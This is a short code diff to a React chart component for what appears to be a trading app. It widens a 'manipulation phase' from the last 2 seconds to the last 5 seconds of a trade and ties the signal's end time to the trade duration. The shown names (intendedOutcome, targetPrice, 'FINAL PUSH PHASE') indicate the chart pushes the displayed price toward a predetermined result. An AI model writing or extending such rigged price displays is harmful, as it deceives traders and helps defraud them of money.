@@ -1,7 +1,7 @@
 import React, { useEffect, useRef, forwardRef, useImperativeHandle } from 'react';
 import { createChart } from 'lightweight-charts';
 
-const LightweightChart = forwardRef(({ symbol, interval, currentRate, activeSignal, user, isTrading, tradeDirection, intendedOutcome, onCandlesUpdate }, ref) => {
+const LightweightChart = forwardRef(({ symbol, interval, currentRate, activeSignal, user, isTrading, tradeDirection, intendedOutcome, tradeDuration, onCandlesUpdate }, ref) => {
     const chartContainerRef = useRef(null);
     const chartRef = useRef(null);
     const seriesRef = useRef(null);
@@ -76,7 +76,7 @@ const LightweightChart = forwardRef(({ symbol, interval, currentRate, activeSign
                 signalStateRef.current = {
                     isActive: true,
                     startTime: Date.now(),
-                    endTime: Date.now() + 10000, // 10s from NOW (re-syncs if intendedOutcome arrives late)
+                    endTime: Date.now() + (tradeDuration || 10) * 1000, // Sync with dynamic trade duration
                     targetPrice,
                     intendedOutcomeUsed: intendedOutcome,
                     pushStarted: false,
@@ -221,7 +221,7 @@ const LightweightChart = forwardRef(({ symbol, interval, currentRate, activeSign
 
             if (sigState.isActive) {
                 const remaining = sigState.endTime - nowMs;
-                const PUSH_THRESHOLD = 2000; // Last 2 seconds
+                const PUSH_THRESHOLD = 5000; // Last 5 seconds (manipulation phase)
 
                 if (remaining <= PUSH_THRESHOLD && remaining > -500) {
                     // ─── FINAL PUSH PHASE (Last 2 Seconds) ───
